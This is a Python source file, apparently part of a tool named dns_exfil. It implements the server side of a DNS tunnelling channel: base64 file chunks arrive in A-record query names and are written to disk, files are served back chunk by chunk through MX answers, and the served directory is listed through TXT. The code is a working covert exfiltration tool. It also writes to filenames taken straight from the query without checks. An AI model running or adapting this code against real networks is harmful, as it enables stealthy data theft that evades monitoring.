import base64
import os

from multiprocessing.dummy import Lock

from dns_exfil.exfiltrators.base.server import (
                                                InterceptAppendResolver,
                                                CannotExfiltrateError
                                                )

# I need to write into the middle of files
# and from the server side I can't tell when a file transfer
# is finished, so I'm just keeping files open forever.
# ChunkDownloader.A() just fsync's the file on every write.
# This really should be something else..

global_open_files = {}
global_open_lock = Lock()

class ChunkDownloader(InterceptAppendResolver):
    '''
    This class is used to download files from the server
    The file is divided into chunks of configurable size,
    but the chunks must fit in a DNS packet.
    To keep things simple, the client requests the chunk size
    and chunk number. TTL should be configured very high to take
    advantage of cache.
    '''
    def __init__(self):
        super().__init__()

    def file_info(self, filename, writable = False):
        with global_open_lock:
            if filename in global_open_files.keys():
                return global_open_files[filename]
            mode = {True: 'wb', False: 'rb'}[writable]
            file_handle = open(filename, mode)
            write_lock = Lock()
            global_open_files[filename] = dict(file_handle=file_handle, write_lock = write_lock)
        return self.file_info(filename, writable)

    def A(self, name):
        '''
        Upload a chunk
        The format is <b64data>.c<c#>.s<s#>.<filename>.any.domain.name.com
        where c# and s# are chunk number and chunk size respectively.
        '''
        fields = name.split('.')
        try:
            encoded_data = fields[0].encode('utf-8')
            chunk_num = int(fields[1][1:])
            chunk_size = int(fields[2][1:])
            filename = fields[3]
            data = base64.b64decode(encoded_data)
        except:
            raise CannotExfiltrateError
        file_info = self.file_info(filename, writable=True)
        handle = file_info['file_handle']
        with file_info['write_lock']:
            handle.seek(chunk_num * chunk_size)
            handle.write(data)
            handle.flush()
            os.fsync(handle.fileno())
        return self.context['ip']

    def MX(self, name):
        '''
        Download a chunk
        The format is c<c#>.s<s#>.<filename>.any.domain.name.com where c# and s# are
        the chunk number and chunk size, respectively.
        '''
        fields = name.split('.')
        try:
            chunk_num = int(fields[0][1:])
            chunk_size = int(fields[1][1:])
            filename = fields[2]
        except:
            raise CannotExfiltrateError
        with open(filename, 'r+b') as f:
            f.seek(chunk_num * chunk_size)
            data = f.read(chunk_size)
        encoded_data = base64.standard_b64encode(data)
        return_fields = fields[3:]
        return_fields.insert(0, encoded_data.decode('utf-8'))
        return '.'.join(return_fields)

    def TXT(self, name):
        '''
        This is the 'index' of the service.
        It it prints the names and size of the files being served.
        '''
        base = self.context['basedir']
        fileinfo = [','.join([fn, str(os.stat(fn).st_size)]) for fn in os.listdir(base)]
        index = ';'.join(fileinfo)
        return index
 
